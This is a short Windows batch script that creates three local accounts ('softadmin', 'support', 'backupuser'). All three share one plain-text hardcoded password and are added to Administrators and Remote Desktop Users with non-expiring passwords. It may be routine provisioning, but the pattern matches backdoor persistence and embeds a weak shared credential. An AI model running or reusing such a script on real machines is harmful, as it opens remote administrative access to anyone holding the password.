@echo off
CD /d "%~dp0"

mkdir c:\BgInfo\do-pass-run
set psswd=saubnc@2020

net users softadmin %psswd% /add
net users softadmin %psswd% /active:yes
net localgroup Administrators /add softadmin
net localgroup "Remote Desktop Users" softadmin /add
wmic useraccount where name='softadmin' set PasswordExpires=FALSE
wmic useraccount where name='softadmin' set disabled=false

net users support %psswd% /add
net users support %psswd% /active:yes
net localgroup Administrators /add support
net localgroup "Remote Desktop Users" support /add
wmic useraccount where name='support' set PasswordExpires=FALSE
wmic useraccount where name='support' set disabled=false

net users backupuser %psswd% /add
net users backupuser %psswd% /active:yes
net localgroup Administrators /add backupuser
net localgroup "Remote Desktop Users" backupuser /add
wmic useraccount where name='backupuser' set PasswordExpires=FALSE
wmic useraccount where name='backupuser' set disabled=false

@echo on